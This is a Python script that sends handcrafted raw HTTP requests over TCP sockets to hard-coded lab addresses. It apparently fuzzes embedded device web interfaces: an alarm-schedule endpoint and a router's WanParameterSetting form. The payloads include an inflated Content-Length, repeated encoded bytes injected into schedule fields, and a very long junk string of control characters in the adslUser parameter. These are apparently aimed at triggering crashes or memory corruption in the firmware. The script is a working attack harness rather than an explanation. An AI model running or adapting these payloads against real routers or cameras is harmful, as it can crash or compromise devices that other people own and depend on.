import socket

def tcp_socket_sender(host, port, raw_data,timeout = 10):
    # 基于 socket TCP 向指定IP指定端口发送数据报文
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((host, port))
        s.settimeout(timeout)
        try:
            # Set the whole string
            s.sendall(raw_data)
        except socket.error:
            # Send failed
            print('--------------------------------------')
            print('Send failed')
            print('--------------------------------------')
        #         print('Message send successfully')

        # Now receive data
        all_receive_data = b''
        reply = True
        try:
            while reply:
                reply = s.recv(4096)
                # all_receive_data = reply
                all_receive_data = all_receive_data + reply
        except socket.error:
            print('--------------------------------------')
            print(socket.error)
            print(raw_data)
            print('--------------------------------------')
            return ''
    return all_receive_data


def udp_socket_sender(host, port, raw_data,timeout = 10):
    # 基于 socket TCP 向指定IP指定端口发送数据报文
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        
        s.settimeout(timeout)
        
            # Set the whole string
        s.sendto(raw_data,(host,port))
        try:
            data, server = s.recvfrom(4096)
        except socket.timeout:
            print('--------------------------------------')
            print('REQUEST TIMED OUT')
            print('--------------------------------------')
    all_receive_data = data
    return all_receive_data

def socket_sender(host,port,raw_data,protocol,timeout = 10):
    if(protocol == 'tcp'):
        receive_data = tcp_socket_sender(host, port, raw_data,timeout)
        return receive_data
    elif(protocol == 'udp'):
        receive_data = udp_socket_sender(host, port, raw_data,timeout)
        return receive_data
    else:
        print('[-] Protocol Unknown!')

def main():
    host = '10.37.129.2'
    port = 8081
    raw_data = b'123'

    fuzz_data = '["0000-0500","0600-0800","0900-1600","1700-24' + '00"]'
    import urllib.parse
    # fuzz_data = urllib.parse.quote_plus(fuzz_data).encode()

    def encode_all(string):
        return "".join("%{0:0>2}".format(format(ord(char), "X")) for char in string)


#     raw_data = b'''POST /stok=j.uhJqyzEhraXLuT!oHws7WvrzCo!Jc7/ds HTTP/1.1
# Host: 192.168.3.4
# Content-Length: 545
# Accept: application/json, text/javascript, */*; q=0.01
# X-Requested-With: XMLHttpRequest
# User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36
# Content-Type: application/json; charset=UTF-8
# Origin: http://192.168.3.4
# Referer: http://192.168.3.4/
# Accept-Encoding: gzip, deflate
# Accept-Language: zh-CN,zh;q=0.9
# Connection: close
#
# {"msg_alarm":{"chn1_msg_alarm_info":{"light_alarm_enabled":"on"}},"msg_alarm_plan":{"arming_schedule_light":{"monday":"%5B%220000-0200%22%2C%220300-2400%22%5D","tuesday":"%5B%220000-1200%22%2C%221300-2400%22%5D","wednesday":"%5B%220000-0400%22%2C%220500-2400%22%5D","thursday":"'''+fuzz_data+b'''","friday":"%5B%220000-2400%22%5D","saturday":"%5B%220000-1200%22%2C%221300-1600%22%2C%221700-2400%22%5D","sunday":"%5B%220000-0400%22%2C%220500-2000%22%2C%222100-2400%22%5D"}},"method":"set"}'''
    # b'%5B%220000-0500%22%2C%220600-0800%22%2C%220900-1600%22%2C%221700-2400%22%5D'

    fuzz_data = b'%31%37'*10

    raw_data = b'''POST /stok=j.uhJqyzEhraXLuT!oHws7WvrzCo!Jc7/ds HTTP/1.1
Host: 192.168.3.4
Content-Length: 58999999
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36
Content-Type: application/json; charset=UTF-8
Origin: http://192.168.3.4
Referer: http://192.168.3.4/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

{"msg_alarm":{"chn1_msg_alarm_info":{"light_alarm_enabled":"on"}},"msg_alarm_plan":{"arming_schedule_light":{"monday":"%5B%220000-0200%22%2C%220300-2400%22%5D","tuesday":"%5B%220000-1200%22%2C%221300-2400%22%5D","wednesday":"%5B%220000-0400%22%2C%220500-2400%22%5D","thursday":"%%5b%22%30%30%30%30%2d%30%35%30%30%22%2c%22%30%36%30%30%2d%30%38%30%30%22%2c%22%30%39%30%30%2d%31%36%30%30%22%2c%22%31%37%30%30%2d%32%34%31%37%%30%30%22%5d","friday":"%5B%220000-2400%22%5D","saturday":"%5B%220000-1200%22%2C%221300-1600%22%2C%221700-2400%22%5D","sunday":"%5B%220000-0400%22%2C%220500-2'''+fuzz_data+b'''%22%2C%222100-2400%22%5D"}},"method":"set"}'''

#     raw_data = b'''POST /stok=j.uhJqyzEhraXLuT!oHws7WvrzCo!Jc7/ds HTTP/1.1
# Host: 192.168.3.4
# Content-Length: 61744
# Accept: application/json, text/javascript, */*; q=0.01
# X-Requested-With: XMLHttpRequest
# User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36
# Content-Type: application/json; charset=UTF-8
# Origin: http://192.168.3.4
# Referer: http://192.168.3.4/
# Accept-Encoding: gzip, deflate
# Accept-Language: zh-CN,zh;q=0.9
# Connection: close
#
# {"msg_alarm":{"chn1_msg_alarm_info":{"light_alarm_enabled":"on"}},"msg_alarm_plan":{"arming_schedule_light":{"monday":"%5B%220000-0200%22%2C%220300-2400%22%5D","tuesday":"%5B%220000-1200%22%2C%221300-2400%22%5D","wednesday":"%5B%220000-0400%22%2C%220500-2400%22%5D","thursday":"%5b%22%30%30%30%30%2d%30%35%30%30%22%2c%22%30%36%30%30%2d%30%38%30%30%22%2c%22%30%39%30%30%2d%31%36%30%30%22%2c%22%31%37%30%30%2d%32%34%30%30%22%5d","friday":"%5B%220000-2400%22%5D","saturday":"%5B%220000-1200%22%2C%221300-1600%22%2C%221700-2400%22%5D","sunday":"%5B%220000-0400%22%2C%220500-2000%22%2C%222100-2400%22%5D"}},"method":"set"}'''

    raw_data = b'POST /goform/WanParameterSetting?0.015144179330194962 HTTP/1.1\r\nHost: 10.37.129.2:8081\r\nConnection: keep-alive\r\nContent-Length: 144\r\nAccept: */*\r\nX-Requested-With: XMLHttpRequest\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36\r\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\r\nOrigin: http://10.37.129.2:8081\r\nReferer: http://10.37.129.2:8081/main.html\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: zh-CN,zh;q=0.9\r\nCookie: password=vet23f; bLanguage=cn\r\n\r\nwanType=0&adslUser=&adslPwd=&vpnServer=&vpnUser=&vpnPwd=&vpnWanType=1&dnsAuto=1&staticIp=&mask=&gateway=&dns1=&dns2=&module=wan1&downSpeedLimit='

    raw_data = b'POST /goform/WanParameterSetting?0.015144179330194962 HTTP/1.1\r\nHost: 10.37.129.2:8081\r\nConnection: keep-alive\r\nContent-Length: 5304\r\nAccept: */*\r\nX-Requested-With: XMLHttpRequest\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36\r\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\r\nOrigin: http://10.37.129.2:8081\r\nReferer: http://10.37.129.2:8081/main.html\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: zh-CN,zh;q=0.9\r\nCookie: password=vet23f; bLanguage=cn\r\n\r\nwanType=0&adslUser--->\ra<\n\r><\r<\n\n\r\n>><>a-\n\r>\n<\r>>a\r-<\n><\n\na>-a\r-\na--\ra-\r>->\na\r\n\r>\r-a<<\n\n\n\n\n<\n>\r\n\n>\r\na\n\ra\na-<\n-><>\n<<\n\r<<-a-><a\r\r>aa\ra>><\n>a>-a--\n<-><<>->a-a<<a<\r--<\r\n\r<><\raaa>\raaa--<>a<<-a>\r\r\ra>\na\n\r-a<-\r\r<-\r\r<\r\r\n\r\r<a>\n<\n\r\na-a-<a\n<\n>\r-<\n--a-\r-<>>\n\n\n<\r<--<<\r><-a>-<->a\ra<a-\n<<>\r\n\r--<<-<aa>\n-<\n<\r><>\r\r-\r\na-<-a-a<-<->a>-aa\r\r\n<-<>\n\ra>a>\n><a\n->\r>-->a\n\r-<\n<a-><\n>a\n\n<\n\r\n>\n>\r\n\na<-\r\r<-><<\r<\r---\n<-<>\n\n\ra\n<\r-\n<a\r<<\n-aa<\na><-<\n-->\n\ra<>\r<-\r>\n<\r>a<-a\r\r\r<<\r\n\ra<-\n\n\r-a<-aaa>\n\na\n\n--<\r\r\na>>\naa\r\n-\n\ra>>>\r\n-\r>\n-a<\na<a\naa\na-\r\n>\ra-->\n-\ra\raa\n>->\r\r\n>-\r->>>\n>\r-\n<>--><>\r><\na-\n\naa-\n<<--\r\n>-a-\r<\r\n<->a\n>\r\r<>\n\r>a><\n-\n>\r\r\r>\n\r<<<\n>\n\ra\na-<<\n<\r-<<->>a\n><<a\r<-\n<\na>-\na-<a-a\n->--a><\ra\n\n\r<<>\r<<-<a>\naa\n<-\n<a\r>>>aa<a-<\r<-a>->\r>--\r\r\n\n<><--a><\raa\n<\r<a\n<-\n\r>-<>\r\r><\n\n><>\n\ra\r<-\r--\n\r<\r\ra><<\r\n\r--\n>\n\n-a\n\n<>\n>\n>a\n\n\na>\r>><<<-<--\n>---\r>\r\n\r>>a\r\n-a<<---a\na->\na\r<\r<\r<<<\r<<>\n-\n>a-a\r<\n>aa\n-\r>a\r>\ra-\ra\r>-\r-a->\r>\ra<a>\n\n\r\n\r<a--\r\r\r\n<\n<a\n<\na\r<\r<\r><a\ra-\n-a>-a\r><aa>a\na>-<\n\r-\n\r->--<>a<a>a><<a\r--\na\r>><\n<a\r><aaa><><a<--aa>\n\naaa<-\n-<<a\n->>-\r>\naaa-\n\n\r-\n>a\r-aa--a->\r<\r<>\na\r-aa\naaa\n>a<--\r<a-\n<><a\r--><-a>\na>\r<>>\r>\r>--a-<-<a\r-->><<\r\r-<><->>a\r><a>\ra<>-<\r>\n\r\r\r--\r-a\r\n><\n>-<><aa\naa\r<-\n\r\r->a-a\na-\n->a<a<><a-\r<>\r-a<>a>a\raa\n\r<\ra>\n\n\r>\r\n>\n\r\n---a<<--aa<\n-\r\n\ra\r\r-\n<\n<<>-\ra-<a\n\r>>\n\n><\r\n>--a<\n\r\r\n\r>\raa-aaa\n\n->-<<--a><<\n\r--<\n\na\n\r>-<>\na-a\r>a>-<<a>>\r\r<<>>-a\n>\ra\ra-\r>\n\n\n<<\ra--\n\r\r-a\raa>>-a\n\r>\r\r>>\n<\n\ra\r\raa>>>>>-<--<\n-\r\ra<>-\n>\n-a\na<<>\r\r<a\naa-\r\ra<>a\r>\ra\r>\n>aa><-<\n<\r<>>\r\ra\r\na\r<aa>\ra<->-\n-\r\r-<>\r\n>a>aa-<a\r\r-\n<a\n-a>\r--a<>\r><--\r<\ra>\n<\r<\n\r>-a<->>\n\n<\n>\n\r\na>aa-a<\n-\r><a\n\r->\r\n\n>\n\n<a<<>a\r-\n-\n-\r-\na--\n-\n<\ra\n<>-<<\r\r>a\n>a\na\r\r\r\r->\r\ra\n\r\r--a\naaa><<>a\ra<\r>-\r>-\n->a\r\ra\na<<a\r-----\r\r>>\n--a\n<-aa\r>a<\r>\n\r>-a<<a\n\n>aaa\r\r\na\r<a\r\n\n\r>-\n><>-\r><\n<\n>a<\n<<--<>a><\r--<a\n\r-\r\r\n<\r\n><\na-\r\n<\n-\r\na<\ra\n\r\ra<-->a<>\r<<\na<-<\n>-<-\r-<-\r\r\r\n\n<>a-aaa>>\n\na>\r\r\ra\na\n>\r\n>><>-<-a\r\n-<>a<\n><>>-a<a\ra-\n<\r\n<><>\r-\r\na-\r\r<<a\r>>-a\n>\n-\n-\r-><><\r\n<\n->\r-\n-<<a>\r\r\r->\n\n-\r-\n>a\n-\n>-<\n>>-\r<\r>a-a\r\r>\na-><--><>a-><<\r>--\ra-<\n-\r-aa\n>\n>><a<\r\r>a<<a---a\n>-\n>--\r-\n<-\r\n-\n\r<<\na-a>\na\r<\n->\r-\n\n>a<--<><<a\r>--\r\r\n-\ra<a><>a>>>><a\n\n>>\n-\r-->><><-\n-\n\n>\n\ra>>\n-\r>>aa<a>\na\r-\n>\r\r<->>>-a>a\n<a>a<>\ra\r<\n>-\n-\r---\n<>a>\r>\r-\r-a-<>\r<\r\n<>-\r<<>\ra\r\r\r<>\ra-\n-\r\n\r>>\r\ra\n-\n\ra<a\ra-<-->a-\n-\n-<-<<\n-<<>aa\r>a>-a-\n\n\r\n\r--\r-\n->\ra\r-<-\n<<>><a<><>\na-<\ra>\n\n\r--aa\na\n->a\r\ra<\n\n\r-\n\ra\r-><<\n\n\r<>aa\n-a>-\r-\r<<<\raa--<>>a\n\n\ra<<a\n\r\r>\r\r\n>-<\n<\r>\na-a->a>-a\naa>a-<\n\n<-<\n<<<a<><a--\na-><\n>a\na\n>\r>\n\r<-\n><\na<\ra-\naa-<a>\r-><<\r\n><\r\ra\r\naa\na-\r\n>>\ra-\r\ra\r\n\r>>>-><aa-\n-\ra--<a\n\r><>\n>>\n-aa<\ra>\n-\n->>\n---\naa\naaa<\r<>\n<<--\n\n-a\raa-\r<a\n<\n->\r>-\r\n<<aa--<\r\r\r\r>\r-\r>\na>\n\ra<-a\n-\n<\n>-<a->>\r\n\r\r-\r\r<\r->\n-<\ra\n><<<>\r>\r\n<\n>\n-\r\n><->\r<\na>aaa<-\n\n\n\r\na>a-a\r><a-\r>-<aa-<a\ra>>a<\n>a-\na\r\r\n>>\n\r-<-\n\n\r->\r\ra\r\n>a<>\r>>>\r>\r-><a\ra><<\n\n\r<<-<aa\ra<a--\na\r<\r\n>\r\r<<\r<>-\n\r\n\r\na\n<a<\n<\n->>-\raa-\n\r<a-\r><a>\n>a--\n->\n><a>-a--\r-<\n<->\r\r-\n>\n\ra<--\r---<\r\r---<\r<>\n>>-<<a-a-\na><>a>a\r><a<<\n--\r\n\r>\n>a--\n<\n<>\n\r>a<a\n\r>><\r\r<\r\n\r\n>\r-\r<-\r<>\r-\r<a>\r--\r-<><\n<\n>\n<<\n>\n<aa\naa>>-a<<\n<->\r\r\r\n<\n--\n><-\n\n>\n>a\r<->a-\n>>\na-\r\r\n-\na-\r\n-\n-\n>-a\n-\n-<><-<<aa\n\r\n-\n<<\r\r\r>\r>--\na-\n<<<-\n-<a\n>>aa\r\n\r\naa\n\r\n>\r-a>-aa-\r-aa<->>>-\r\r>\na<\n-<>-<<a\r-<a\raa\r\raa>\r><<<\n<\r\r>>--aa>>\n\r<<\r\r>-\na>-\na<>>\r<aa><a<-\na-\r<aa<\n-\n>\na>\n<\n-<-a\r<a>a-\r><>\n\r-\r>\r>>a\r<\r\r\na\r>-<\na-<a\n<<><>-<<--a--a>aa>\r\r\r><--a\na<>><-<a-\n><a<\n---<>aa\r\n--\n<>\n-\n\r-<a<\n>\r-\n>a>a<<\n-\r->\n\r-a\n-a--\n>a-<\r\n>\ra-\naa\r\r<><>\naa\na<\r\na->>\r<\r<\n\r>>\n<a-\r\r\r-\r>-a>a---\r\n\r-a<a\na\r\ra\r\r<<<<\ra\n\r->->-aa-\r\n>>>a\ra-\n<\n\n\r<\r<\n\n-\r>\r-\r>\na-->a->a\r>\r\n->-\n\n\r><aa\r\r<\r<a>><><\na\raa>-<>\n\na>a\r\r\n-a\r<aa<>->><>\na<-\n--\r-><>\n\r<a\na<<\ra>\n\r<<<\r\n<\na\r\r--\r-\na\ra<a<-\na<-\r->-\na\r>-<a\r\r\na<><<\n\naa\n\r\n>a-\na>a\ra\n\r>\n\r\n\r>\r-\r\raaaa<-<\r\r><->-\n\n\r\na\ra<\r\n\n>\n\r<<-<a<\r\r-\r\n<a-a\n-\r>>>a-<>>>\r\n-\r\r<-\r-><<<-\n\n-\r><-a<<-a><<>-\ra\r<-->a\r<-\n\r-\r\r--\ra<\n\r\n>>><<-a-\r<-\n\na-\n<\n>\n\n-aa--\r\n\ra<<\r\n\r><-\n>a\r\n--<\n\n><a>><--<\n\n\r>\r<\r<\r\ra<\n<\na<a>\r-><<\r\r\n-\r>\n<<<<\ra\n\n\r\r>\n\r---><\n<\n<-\n\r\n>a\ra\r\r\n<>\r-a\n\n-<aa\n>-\r>>\n-<->>\r\ra\r>\r\r\ra--\n>a>a<>\n<-\n-a<aa\r\n>><>a\n\n<\r-a<<\r\r<><><\r><-\r<--\na-\n-<<>\n\n->a><><-\na<\n-a<\r<a<a>--<-\r>\r\r><>a-\n\r\n<aa\r\n\r\r\n>-\n<<a\n-a<\r\n\n><>a<>-<-\r-<\na\r><a>--\na\r<<--\n>-\n\na-\n>>>\r<aa\r-aa<\r\r\r\r>\n>><-\ra\r\r>a\n\n\r<a--<<-\n<<-\r>--\n<a\n<a<-\n-\n\n\n\r\r>aaaa\n--\naa<a<-<\n<aa->\n<<\r\r-a-\n>a\ra>><\n>\r-\na<a\n\r>>->\n>\n\r\n\r\na>\n\na<a>-\r\n\r<\r-<\n\n\n->><\r<>><\n-a>\n\r>\r\n\n<\n-\n-<<aa\n>--<\r-a\r>a>\n\na\r-\r>>\r\n<-a\ra>a<\r-a\n<\n-a<<<<<--\r-\r\n<<<\r\r\n>a\r\r><<<>-a>a\r<-aa-\r\r\r->-\n>-<<-->-aa--<\n\n\r\raa-\na-<->>\n\r-\n\n<--\n\r>aa>a<\n\na\r\r<>\na<<a<-->a<<<<<\r>a\r<\n-\n\naa>\n-->a\n>\r-<\r>-\n<\r<\n<\r><aa><>\r\r<>>\n\n>\r\r\r-\n<\r\n-<<\n\r\n-\na>-<-<<<\r>-\r>a\n-\n\na-<-\n<<\r\r<-\na>-a\n\na\n<a>><--\r-a-\n\ra>>\r\n\r\n>\r>\n<>\n\n>\n\ra--\n>\n-aa>--\r\n\r\r->->-<-<a\r<a\n>\n\r\r\r<<>a\r<<-\na>\n\r\n\n<->a\r<-\n-<a\na>a-\r-aa\n-<\r-\r<\n\r\r\n\raa>>>----\ra\r>a<>-a\n\n<<a\n-\n>a<a\r\r\r-\r\n\r>\n>\na\r>-\r>>-a\r<>-a-a<<\r>a>a-<<a-<\na><<->>\r\n<\na<>--->\na<<\r>a\r<<\ra\r\n><<\na>>\n--\n\r\n<->\r\ra-<<<>-\r\ra\n>\n\r>>\ra<\r-<<--\n--<\r\n\r>\r>a\n-<\n\n\r<-<>\n\naa>-<aa\r<<<<\ra-><\r\r-\ra\n>a<\n-<<a\n\ra>a<->\n><---\n<\raa-<a\n>\n\r><\n<>\r\n\n\r<<>\r<>>a-\r---\n><a<<--a->a--\r-aa>a-aa<\r\r\n\na<a\ra\r\ra<a<-><\r<\n\r\r\ra>\n\n-\n<aa\r\n\r-\ra\n\ra\ra\n>\n>\r\n<a\n\r\n>\r-\n\na<\r\n\n\n\na>>>\r<-<a>-<a<a<-\na>->\n<<\r\na\n\r->>\n\r>a\n--\r<\r\n<>a-\n-a\n\r->\n<>\n\r\ra>>\n\ra<>>-\ra<<>\r<\naa--\na><\na<a<\n>\r><>>>>a<aa-\r-a>\r-<><><-aa>\n<-<aa\n><\raaa<-\n\r<\ra-\n\ra<<a\r\n-\r\r\r-<a\n-<>-\r\na-\r\n<\ra\ra\n\r>\r\r\n-a<>-a><a->-\na><\n\n<<>-\n->\ra<<a>->->a<<->>a>\na\r\r<\n>a--\r<-<\r-aa<a\n<\r\n>\r-\n\r\n-<a\r<>-<\na>--\ra-a\r>><a-a\r<a<<-\na-<-\r<<>>a->><\na\raa<<>\r\n<>\na><a>-a>>a\r\n--\r\r<---\ra\n-a-a\r--->><aa<\r<\n>-<>\n>\r\r><aa-\ra\r\n<\r<\na>>>-a\r>>>\n<\n-a\n>\r\n<\n\n\n\n>>\r<>><aaaa<a\n\n\r<-<\r\n>a>>a<\r\n>-<\r<<\n>>\n-><>---<-<<\r\r-<\n-->-a-<<><\r<>\n\r\r<-<a\r-\r--<-<\naaa\n<a\n>\r><\raa>><<\r>>\r=&adslPwd=&vpnServer=&vpnUser=&vpnPwd=&vpnWanType=1&dnsAuto=1&staticIp=&mask=&gateway=&dns1=&dns2=&module=wan1&downSpeedLimit='

    # raw_data = raw_data.replace(b'\n',b'\r\n')
    protocol = 'tcp'
    # for i in range(10):
    receive_data = socket_sender(host,port,raw_data,protocol)
    print(receive_data)

if __name__=="__main__":
    main()